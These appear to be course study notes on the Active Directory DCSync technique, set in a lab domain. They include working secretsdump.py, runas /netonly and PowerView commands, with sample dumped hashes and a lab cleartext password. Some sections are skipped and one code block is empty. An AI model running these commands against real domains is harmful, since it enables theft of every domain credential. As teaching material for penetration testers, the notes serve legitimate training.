# 🩸 DCSync

> [!info] Objective  
> **DCSync** abuses Active Directory replication privileges to make a compromised account behave like a Domain Controller and request replicated credential data from a DC.
> 
> In this scenario, the previous ACL-enumeration chain gave us control over **`adunn`**, and `adunn` has the replication rights required to perform DCSync against the `INLANEFREIGHT.LOCAL` domain.

# 🧭 2. Tool Roles & Differences

|Tool|Primary role|When to use|
|---|---|---|
|**PowerView**|Enumerates AD objects, ACLs, users, groups, and privileges|Confirm that a compromised account actually has replication rights|
|**secretsdump.py**|Performs credential extraction, including DCSync|Linux-based attack host when you have valid credentials with replication rights|
|**Mimikatz**|Windows credential/security testing toolkit; `lsadump::dcsync` performs DCSync|Windows attack host when operating in the context of an account with replication privileges|
|**`runas.exe`**|Starts a Windows process with different network credentials|Run Mimikatz from a session that authenticates to the domain as the DCSync-capable account|
|**Get-ADUser**|Native Microsoft AD enumeration|Check account configuration such as reversible password encryption|
|**ADSI Edit**|GUI for viewing/modifying AD objects and permissions|Visually inspect replication permissions and directory objects|

> [!important] Mental Model  
> Think of the tools as different layers:
> 
> **PowerView → prove the privilege exists**  
> **DCSync → abuse the replication privilege**  
> **secretsdump.py / Mimikatz → perform the credential extraction**
> 
> The important distinction is that **DCSync is the technique**, while `secretsdump.py` and Mimikatz are tools that can perform it.

# 🧠 3. What Is DCSync?

**DCSync** is an Active Directory credential-extraction technique that abuses the **Directory Replication Service Remote Protocol**.

Domain Controllers normally use replication to synchronize directory information with one another.

The attacker abuses the same mechanism:

```text
Compromised account
       │
       │ has replication rights
       ▼
Domain Controller
       │
       │ replication request
       ▼
Directory credential data
       │
       ├── NTLM password hashes
       ├── Kerberos keys
       └── potentially other replicated secret data
```

The attacker does **not** need to log directly onto the Domain Controller.

Instead, the attacker asks the DC to provide replicated directory information as if the request were coming from another legitimate replication partner.

> [!important] Core Concept  
> **DCSync = impersonating the replication behavior of a Domain Controller using an account that has the required replication permissions.**

This is why ACL enumeration from the previous section is so important.

The previous chain eventually gave us:

```text
wley
  │
  └── ForceChangePassword
          ↓
      damundsen
          │
          └── GenericWrite
                  ↓
          Help Desk Level 1
                  │
                  └── nested in
                          ↓
                 Information Technology
                          │
                          └── GenericAll
                                  ↓
                                adunn
                                  │
                                  └── Replication Rights
                                          ↓
                                       DCSync
```

The ACL attack path therefore leads directly into this technique.

# 🔐 4. Required DCSync Privileges

The critical permissions are Active Directory replication rights.

The source specifically identifies:

- `DS-Replication-Get-Changes`
    
- `DS-Replication-Get-Changes-All`
    
- `DS-Replication-Get-Changes-In-Filtered-Set`
    

The important one for retrieving secret replicated information is:

```text
DS-Replication-Get-Changes-All
```

These are **Extended Rights** assigned through Active Directory ACLs.

By default, privileged domain groups such as **Domain Admins** and **Enterprise Admins** have the necessary replication capability, but an assessment may uncover ordinary domain accounts that have been granted these permissions.

> [!warning] Why This Matters  
> A user does **not** need to be a Domain Admin simply because they can perform DCSync.
> 
> An ordinary domain user can become extremely powerful if ACLs or group membership grant them the required replication rights.

# 🐧 8. DCSync from Linux — `secretsdump.py`

[Impacket / secretsdump.py documentation](https://github.com/fortra/impacket?utm_source=chatgpt.com)

From a Linux attack host, Impacket's `secretsdump.py` can perform DCSync.

Example:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

The tool prompts for `adunn`'s password:

```text
Password:
```

It then communicates with the Domain Controller and extracts credential material.

Example output:

```text
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted
[*] Reading and decrypting hashes
```

The resulting account entries contain information such as:

```text
domain\username:RID:LMHash:NTHash:::
```

Example:

```text
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
```

The important credential component for modern Windows authentication attacks is generally the **NT hash**.

> [!important] `-just-dc`  
> The `-just-dc` option tells `secretsdump.py` to focus on domain-controller replication data and extract **NTLM hashes and Kerberos keys** from the NTDS data.

# 🎯 9. Targeting Specific Data with `secretsdump.py`

Dumping the entire domain is not always necessary.

### NTLM hashes only

```bash
secretsdump.py -just-dc-ntlm ...
```

Useful when the objective is specifically NTLM credential material.

### Specific user

```bash
secretsdump.py -just-dc-user <USERNAME> ...
```

This limits extraction to a specific account.

For example, rather than dumping the entire domain:

```text
Entire domain
     ↓
Potentially hundreds/thousands of accounts
```

you can target:

```text
Domain
  ↓
Specific user
  ↓
Specific credential material
```

> [!tip] Pentesting Methodology  
> If you only need the hash of a particular privileged account, targeting that account reduces unnecessary credential collection.

# 📊 10. Useful `secretsdump.py` Options

### `-pwd-last-set`

```bash
secretsdump.py -pwd-last-set ...
```

Displays when each account's password was last changed.

This can be useful during password-audit reporting.

---

### `-history`

```bash
secretsdump.py -history ...
```

Dumps password-history information.

Password history can provide additional information for:

- Offline password-cracking analysis
    
- Password reuse analysis
    
- Domain password-strength assessment
    

---

### `-user-status`

```bash
secretsdump.py -user-status ...
```

Provides account-status information.

This is particularly useful during assessment reporting because a domain may contain disabled accounts whose credentials should not be included when calculating active-account password statistics.

For example:

```text
NTDS dump
   │
   ├── Active accounts
   │
   └── Disabled accounts
          ↓
      Filter them
          ↓
Password audit statistics
```

This helps ensure metrics such as:

- Number and percentage of passwords cracked
    
- Top passwords
    
- Password length
    
- Password reuse
    

are based on the appropriate population of active accounts.

# 📁 11. Files Created by `-just-dc`

After running:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc ...
```

we can inspect the generated files:

```bash
ls inlanefreight_hashes*
```

Output:

```text
inlanefreight_hashes.ntds
inlanefreight_hashes.ntds.cleartext
inlanefreight_hashes.ntds.kerberos
```

These represent different categories of extracted credential material:

|File|Contains|
|---|---|
|`inlanefreight_hashes.ntds`|NTDS credential data / NTLM hashes|
|`inlanefreight_hashes.ntds.kerberos`|Kerberos keys|
|`inlanefreight_hashes.ntds.cleartext`|Passwords recovered from accounts using reversible password encryption|

> [!warning] Important  
> The `.cleartext` filename does **not** mean normal AD passwords are ordinarily stored as plaintext.
> 
> The cleartext values in this scenario come from accounts configured for **reversible password encryption**.

# 🔐 12. Reversible Password Encryption

Active Directory has a setting that permits passwords to be stored using **reversible encryption**.

The relevant User Account Control flag is:

```text
ENCRYPTED_TEXT_PWD_ALLOWED
```

This setting is uncommon but can appear in real assessments.

When enabled, password material is stored in a reversible form so applications requiring the original password can use it.

The source notes that the password is stored using **RC4-based reversible encryption**, rather than being stored directly as ordinary plaintext.

> [!important] Key Distinction  
> **Reversible encryption ≠ plaintext storage**
> 
> The password is stored in an encrypted form that can potentially be decrypted when the necessary system key material is available.

# 🔎 13. Finding Reversible-Encryption Accounts with `Get-ADUser`

[Microsoft Get-ADUser documentation](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?utm_source=chatgpt.com)

We can search for users whose `userAccountControl` contains the relevant bit:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

Example:

```text
DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
useraccountcontrol : 640
UserPrincipalName  :
```

The important part is:

```text
userAccountControl : 640
```

The relevant bit is:

```text
128
```

which corresponds to:

```text
ENCRYPTED_TEXT_PWD_ALLOWED
```

# 🔍 14. Finding the Same Setting with PowerView

PowerView can perform the same enumeration:

```powershell
Get-DomainUser -Identity * |
? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
select samaccountname,useraccountcontrol
```

Example:

```text
samaccountname    useraccountcontrol
--------------    -----------------
proxyagent        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

This gives us a quick way to identify accounts where reversible password encryption is enabled.

# 🔓 15. Viewing the Decrypted Password

If `secretsdump.py` successfully recovers a reversible-encryption password, it can appear in:

```text
inlanefreight_hashes.ntds.cleartext
```

For example:

```bash
cat inlanefreight_hashes.ntds.cleartext
```

Output:

```text
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

This is particularly significant during a penetration test because the recovered value can potentially be used for authentication to other services.

> [!warning] Assessment Impact  
> Accounts configured with reversible password encryption can turn an otherwise credential-hash-focused dump into recovery of the account's actual password material.

# 👤 17. Using `runas.exe` to Use `adunn`'s Credentials

[Microsoft runas documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/runas?utm_source=chatgpt.com)

If the current Windows session is not running as `adunn`, we can launch a new PowerShell process using `adunn`'s network credentials:

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Windows prompts for the password:

```text
Enter the password for INLANEFREIGHT\adunn:
```

Then:

```text
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

### 🧠 Why `/netonly` Matters

The new PowerShell process does not necessarily become a complete local logon session as `adunn`.

Instead, `/netonly` causes the supplied credentials to be used for **network authentication**.

Mental model:

```text
Current Windows user
        │
        │ runas /netonly
        ▼
New PowerShell process
        │
        └── Network authentication → INLANEFREIGHT\adunn
                                      │
                                      ▼
                                  Domain Controller
```

This is useful when the local Windows attack host is not logged in as the account that possesses the domain privilege.

# 🎯 19. Targeting the Administrator vs. the Entire Domain

DCSync does not inherently mean:

> "Dump everything."

The attacker can target a specific account.

For example:

```text

  │
  ├── Entire domain
  │      └── many accounts
  │
  └── Specific account
         └── administrator
```

With `secretsdump.py`:


```text

```

This distinction matters operationally because an assessment may have a specific objective rather than requiring every credential in the domain.

# 🧩 22. Why DCSync Is Different from NTDS.dit Theft

A useful distinction:

|Technique|Basic idea|
|---|---|
|**NTDS.dit theft**|Obtain a copy of the Domain Controller's `NTDS.dit` database and extract credentials from it|
|**DCSync**|Abuse AD replication functionality to request credential data remotely|
|**Mimikatz DCSync**|Windows implementation of the DCSync technique|
|**secretsdump.py DCSync**|Impacket implementation that can perform the extraction remotely|

The major mental-model difference is:

```text
NTDS.dit theft:
Attacker → obtains database → extracts credentials

DCSync:
Attacker → requests replicated data from DC → receives credentials
```

Therefore, DCSync does **not** require simply copying `NTDS.dit` from disk.

# 🧠 25. CPTS Mental Model

> [!tip] Think of DCSync as "LDAP/AD replication abuse," not simply "hash dumping."

The most important reasoning chain is:

```text
"Who am I?"
      ↓
"Who do I control?"
      ↓
"What ACLs does that identity have?"
      ↓
"Does it control a user/group with more privileges?"
      ↓
"Does the resulting identity have replication rights?"
      ↓
"Can I perform DCSync?"
      ↓
"What credential material is relevant to my objective?"
```

This is exactly why the previous **ACL Enumeration** section matters.

DCSync is often not the first thing you discover.

Instead, the path can look like:

```text
Low-privileged foothold
        ↓
ACL abuse
        ↓
Account takeover
        ↓
Group/control relationship
        ↓
Privileged account
        ↓
Replication rights
        ↓
DCSync
```

# 📌 26. Quick Comparison

|Situation|Tool / Method|Main purpose|
|---|---|---|
|Need to prove a user has replication rights|**PowerView**|Enumerate ACLs and replication permissions|
|Linux attack host|**`secretsdump.py`**|Perform DCSync and extract credential material|
|Windows attack host|**Mimikatz**|Perform DCSync against a specified user|
|Current Windows session is not the DCSync user|**`runas /netonly`**|Launch a process that uses the privileged account's network credentials|
|Need NTLM only|**`-just-dc-ntlm`**|Limit extraction to NTLM hashes|
|Need one account|**`-just-dc-user`**|Limit extraction to a specific user|
|Need password-change timestamps|**`-pwd-last-set`**|Include password last-set information|
|Need password history|**`-history`**|Include historical password information|
|Need active/disabled account status|**`-user-status`**|Include account-status information|
|Need to find reversible encryption accounts|**`Get-ADUser` / `Get-DomainUser`**|Identify `ENCRYPTED_TEXT_PWD_ALLOWED` accounts|

# 🧾 27. Key Takeaways

> [!success] Remember These
> 
> 1. **DCSync abuses Active Directory replication**, rather than requiring direct access to the DC's `NTDS.dit`.
>     
> 2. The attacker needs an account with the appropriate **replication rights**.
>     
> 3. Important rights include **`DS-Replication-Get-Changes`** and **`DS-Replication-Get-Changes-All`**.
>     
> 4. A normal domain user can potentially have DCSync capability if ACLs grant the required rights.
>     
> 5. **PowerView** can verify replication rights before attempting the attack.
>     
> 6. **`secretsdump.py`** is useful from Linux.
>     
> 7. **Mimikatz** can perform DCSync from Windows.
>     
> 8. `runas /netonly` can launch a process using the DCSync-capable account's network credentials.
>     
> 9. `-just-dc` can retrieve NTLM hashes and Kerberos keys.
>     
> 10. `-just-dc-ntlm` limits extraction to NTLM hashes.
>     
> 11. `-just-dc-user <USERNAME>` targets a specific account.
>     
> 12. `-history`, `-pwd-last-set`, and `-user-status` provide additional assessment/reporting data.
>     
> 13. Accounts with **`ENCRYPTED_TEXT_PWD_ALLOWED`** may yield recoverable password material.
>     
> 14. DCSync can target highly sensitive accounts such as **`administrator`** or **`krbtgt`**.
>     
> 15. The most important CPTS connection is:
>     
> 
> ```text
> ACL Enumeration
>       ↓
> Identify replication rights
>       ↓
> Control the privileged identity
>       ↓
> DCSync
>       ↓
> Credential material
> ```
